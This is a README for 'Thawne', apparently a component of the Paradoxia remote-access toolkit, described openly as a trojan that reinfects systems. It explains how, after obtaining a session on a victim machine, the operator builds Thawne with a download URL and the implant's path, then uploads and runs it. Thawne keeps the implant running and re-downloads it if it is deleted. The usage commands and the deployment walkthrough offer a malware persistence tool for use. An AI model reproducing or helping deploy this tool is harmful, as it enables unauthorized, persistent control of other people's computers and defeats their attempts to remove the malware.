## Thawne
Thawne is a Sentinel for your Program. A trojan that Reinfects systems. It installs itself on the system it's Executed on. After which Thawne keeps checking if your File Exists on the System and is Running. If it's not running then Start it, If it does not exist or is removed Reinstall it.

#### Example
![thawne](https://github.com/quantumcored/paradoxia/blob/master/images/thawne.gif)

#### Deployment (Example)
After getting a Session in Paradoxia, You can see Bot information and in it, The **Agent Location**, Which is in this case the file I want to be guarded.

![img](https://github.com/quantumcored/paradoxia/blob/master/images/agentlocation.PNG)

We can use thawne with the **Agent Location** and it's absolute filename.

```bash
./thawne http://www.myfileserver/file_to_replace.exe < Absolute Filename > < PATH > 
```

and then Upload the file and Execute it.

#### USAGE 
```bash
$ cd Thawne
$ ./thawne < direct file download link > < filename to watch > < file path to watch >
```
